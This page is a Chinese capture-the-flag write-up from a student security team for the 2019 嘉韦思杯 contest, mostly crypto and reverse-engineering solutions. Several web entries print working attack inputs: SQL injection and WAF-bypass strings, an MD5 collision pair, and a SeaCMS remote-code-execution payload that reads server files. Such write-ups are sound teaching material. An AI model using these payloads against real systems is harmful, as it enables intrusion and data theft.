<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>嘉韦思杯 writeup | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/8.c6432f97.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/11.c5844bad.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>嘉韦思杯 writeup</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2019-ecnu.html#土肥原贤二" class="sidebar-link">土肥原贤二</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#吴佩孚" class="sidebar-link">吴佩孚</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#日军空袭" class="sidebar-link">日军空袭</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#飞虎队" class="sidebar-link">飞虎队</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#戴星炳" class="sidebar-link">戴星炳</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#大美晚报" class="sidebar-link">大美晚报</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#潘汉年" class="sidebar-link">潘汉年</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#袁殊" class="sidebar-link">袁殊</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#晴气庆胤" class="sidebar-link">晴气庆胤</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#_76-号" class="sidebar-link">76 号</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#梅津美治郎" class="sidebar-link">梅津美治郎</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#冈村宁次" class="sidebar-link">冈村宁次</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#作战计划" class="sidebar-link">作战计划</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-ecnu.html#池步洲" class="sidebar-link">池步洲</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="嘉韦思杯-writeup"><a href="#嘉韦思杯-writeup" class="header-anchor">#</a> 嘉韦思杯 writeup</h1> <p>可以称得上是欢乐赛了，总体难度不大，所以将所有人 wp 整理成一份</p> <h2 id="土肥原贤二"><a href="#土肥原贤二" class="header-anchor">#</a> 土肥原贤二</h2> <p>常规 sql 注入，注入点 id，<code>order by</code>发现有 4 列，先猜一下 flag 表的 flag 字段，直接注入<code>id = ' union select 1,2,3,flag from flag</code>得到结果</p> <h2 id="吴佩孚"><a href="#吴佩孚" class="header-anchor">#</a> 吴佩孚</h2> <p>base64 解出来是 JSfuck，然后在 F12 里执行</p> <h2 id="日军空袭"><a href="#日军空袭" class="header-anchor">#</a> 日军空袭</h2> <p>多层 base64，解出来是 key=5 的栅栏密码</p> <h2 id="飞虎队"><a href="#飞虎队" class="header-anchor">#</a> 飞虎队</h2> <p>希尔密码，根据 key 求出逆矩阵，然后与 str 做乘法，参考http://2-dreamfever.lofter.com/post/1d226cf1_748daf4
求逆矩阵这里，matlab 和 octave 都是小数，最后解不出来
再转换成字符串</p> <h2 id="戴星炳"><a href="#戴星炳" class="header-anchor">#</a> 戴星炳</h2> <p>写一个 py</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests <span class="token keyword">as</span> req
<span class="token keyword">import</span> re
a <span class="token operator">=</span> req<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;http://47.103.43.235:82/web/a/index.php&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;p&gt;(0.*)&lt;/p&gt;'</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># input(res[0])</span>
res <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
a <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;http://47.103.43.235:82/web/a/index.php&quot;</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">&quot;result&quot;</span><span class="token punctuation">:</span>res<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h2 id="大美晚报"><a href="#大美晚报" class="header-anchor">#</a> 大美晚报</h2> <p>下载二维码 binwalk 跑一下，得到一个带密码的压缩包，提示是 QQ 号，果断爆破，用 ARCHPR 或者 Ziperello 都可以，但是 fcrackzip 似乎效果不好</p> <h2 id="潘汉年"><a href="#潘汉年" class="header-anchor">#</a> 潘汉年</h2> <p>变形的凯撒，用密文前 4 位和 flag 做差，发现相差<code>4567</code></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">&quot;bg[`sZ*Zg'dPfP`VM_SXVd&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>

out<span class="token punctuation">:</span> flag<span class="token punctuation">{</span>c4es4r_variation<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="袁殊"><a href="#袁殊" class="header-anchor">#</a> 袁殊</h2> <p>标准 RSA</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
N <span class="token operator">=</span> <span class="token number">0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span>
p <span class="token operator">=</span> <span class="token number">273821108020968288372911424519201044333</span>
q <span class="token operator">=</span> <span class="token number">280385007186315115828483000867559983517</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'fllllllag.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>
text <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h2 id="晴气庆胤"><a href="#晴气庆胤" class="header-anchor">#</a> 晴气庆胤</h2> <p>php 代码</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>md5 碰撞</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>a = %D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap
b = %D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_76-号"><a href="#_76-号" class="header-anchor">#</a> 76 号</h2> <p>32 位小端 elf，IDA 发现 main 损坏，看了看文件名，以为会有混淆啥的，然后发现导致问题的是 main 中一个 jmp 跳转了-1 也就是，跳转后程序将从 jmp-1 的第二字节 0xFF(-1)继续执行，这里导致 ida 分析失败，删除 ida 分析的 main 函数，手动从 jmp-1 跳转到的位置添加函数(因为前半段没啥东西)。修改前后对比：
<img src="/assets/img/2019-ecnu-1.56165743.png" alt="2019-ecnu-1"> <img src="/assets/img/2019-ecnu-2.183dfbe1.png" alt="2019-ecnu-2"> <img src="/assets/img/2019-ecnu-3.ba9c1cb0.png" alt="2019-ecnu-3">
分析逻辑，输入，804850 检查，输出正确/错误。检查函数内部看着挺吓人，不过其实逻辑比较简单，每一轮循环依次检查字符串中的一个字符，在 v5 数组中打一个点，然后根据当前位置的字符走 switch，swith 中的每一个分支会判断当前正在检查第几个字符，并于写死在代码中的值比较，并且比较 v5 中打点的位置是否是代码中写死的一个值。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v5<span class="token punctuation">[</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x70u</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token char">'\n'</span><span class="token operator">:</span>
          <span class="token keyword">return</span> v2 <span class="token operator">==</span> <span class="token number">13</span> <span class="token operator">&amp;&amp;</span> v5<span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'0'</span><span class="token operator">:</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">||</span> <span class="token operator">!</span>v5<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          v2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'1'</span><span class="token operator">:</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">14</span> <span class="token operator">&amp;&amp;</span> v5<span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
            <span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'2'</span><span class="token operator">:</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> v5<span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
            <span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'3'</span><span class="token operator">:</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">!=</span> <span class="token number">89</span> <span class="token operator">||</span> <span class="token operator">!</span>v5<span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          v2 <span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'4'</span><span class="token operator">:</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">!=</span> <span class="token number">15</span> <span class="token operator">||</span> <span class="token operator">!</span>v5<span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          v2 <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token char">'5'</span><span class="token operator">:</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">!=</span> <span class="token number">14</span> <span class="token operator">||</span> <span class="token operator">!</span>v5<span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>这里其实仿佛是冗余，switch 走到哪个分支是按照正在检查的字符 ascii 码决定的，而 v5 中打点的位置实际上和字符 ascii 是线性关系。但并不是，其实代码中一部分 v5 和 switch 是不匹配的，这些是正确答案不能到达的区域。例如：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">case</span> <span class="token char">'c'</span><span class="token operator">:</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">!=</span> <span class="token number">32</span> <span class="token operator">||</span> <span class="token operator">!</span>v5<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token comment">//!!!</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>
  <span class="token keyword">continue</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>去掉这些障眼法，每一个位置上的字符就几乎是唯一的了……几乎 V2==12 的有三个结果，其中一个是假的，而剩下两个</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">case</span> <span class="token char">'k'</span><span class="token operator">:</span>
  <span class="token keyword">return</span> v2 <span class="token operator">==</span> <span class="token number">12</span> <span class="token operator">&amp;&amp;</span> v5<span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token char">'6'</span><span class="token operator">:</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">!=</span> <span class="token number">12</span> <span class="token operator">||</span> <span class="token operator">!</span>v5<span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
  <span class="token keyword">continue</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token char">'\n'</span><span class="token operator">:</span>
  <span class="token keyword">return</span> v2 <span class="token operator">==</span> <span class="token number">13</span> <span class="token operator">&amp;&amp;</span> v5<span class="token punctuation">[</span><span class="token number">74</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>当_getline 返回的字符串最后为\n 而非\0 时本题有两个可行解</p> <h2 id="梅津美治郎"><a href="#梅津美治郎" class="header-anchor">#</a> 梅津美治郎</h2> <p>运行之后有特征字符串<code>ROBOTIC AUTHENTICATION SYSTEM</code>，google 到原题，复现之
https://depier.re/hacklu_2K13_roboauth_reverse_150/
IDA 略微分析程序逻辑，main 函数前后干了点事情，不过不重要，scanf 输入的第一个密码和另一段空间做了 strcmp，动调直接抠出比较的字符串
<img src="/assets/img/2019-ecnu-4.9235a495.png" alt="2019-ecnu-4">
继续往下走，然后在某个递归函数中经过几层之后，出现了一个断点，手动过掉断点或者在原始文件中 patch 掉断点之后程序在显示 Please enter the second Password:提示之后就会直接结束，推测这里是用断点控制程序流程，而断点被调试器接收了，所以程序没收到信号导致程序结束。不过有个细节是这过程中没有从命令行接收输入，也就是说完全可以不调试把第一个密码过掉，然后在输入第二个密码等待用户输入的时候，再把调试器 attach 上去。当然某些调试器可以自动的选择将用户程序的断点信号传递给用户程序处理。回到 ida
<img src="/assets/img/2019-ecnu-5.0d401a1c.png" alt="2019-ecnu-5">
推测选中的函数是判断第二组密码的，逻辑也很清晰，a2 串异或 2 然后与 a1 逐位比较
<img src="/assets/img/2019-ecnu-6.06064329.png" alt="2019-ecnu-6"> <img src="/assets/img/2019-ecnu-7.c6ff42bd.png" alt="2019-ecnu-7">
所以将 u1nnf2lg 与 2 异或得到的就是 flag 的后半部分</p> <h2 id="冈村宁次"><a href="#冈村宁次" class="header-anchor">#</a> 冈村宁次</h2> <p>第一题的加强版，id 是 base64 之后逆置，waf 会删除 or、select、union 等词，复读绕过，空格用/**/绕过</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>1/**/ununionion/**/seselect/**/1,2,3,flag,5,6/**/from/**/flag
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="作战计划"><a href="#作战计划" class="header-anchor">#</a> 作战计划</h2> <p>seacms 远程代码执行，freebuf 上面有漏洞分析，拿来复现
https://www.freebuf.com/vuls/150042.html
扫描根目录文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ev&amp;9[]=al($_POST[asdasd]);&amp;asdasd=var_dump(scandir('/'));
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>读取 flag</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ev&amp;9[]=al($_POST[asdasd]);&amp;asdasd=echo(file_get_contents('/flag.txt'));
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="池步洲"><a href="#池步洲" class="header-anchor">#</a> 池步洲</h2> <p>得到源码文件 index.phps</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>利用 php 的 sha1 对数组参数返回 false，传 name[]=1&amp;password[]=2 进去</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/8.c6432f97.js" defer></script>
  </body>
</html>
